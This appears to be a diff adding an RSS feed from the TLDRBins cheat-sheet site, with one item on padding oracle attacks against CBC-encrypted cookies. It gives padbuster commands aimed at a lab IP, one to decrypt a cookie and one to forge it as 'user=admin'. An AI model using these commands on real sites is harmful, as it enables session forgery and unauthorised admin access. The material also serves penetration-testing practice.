@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cbc on TLDRBins</title>
+    <link>https://tldrbins.github.io/@cbc/</link>
+    <description>Recent content in Cbc on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@cbc/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Padding Oracle</title>
+      <link>https://tldrbins.github.io/padding_oracle/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/padding_oracle/</guid>
+      <description> padbuster Download padbuster&#xA;# 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://10.10.11.10/index.php &amp;lt;COOKIE_VALUE&amp;gt; 8 -cookies &amp;lt;COOKIE_NAME&amp;gt;=&amp;lt;COOKIE_VALUE&amp;gt; -encoding 0 -plaintext user=admin </description>
+    </item>
+  </channel>
+</rss>
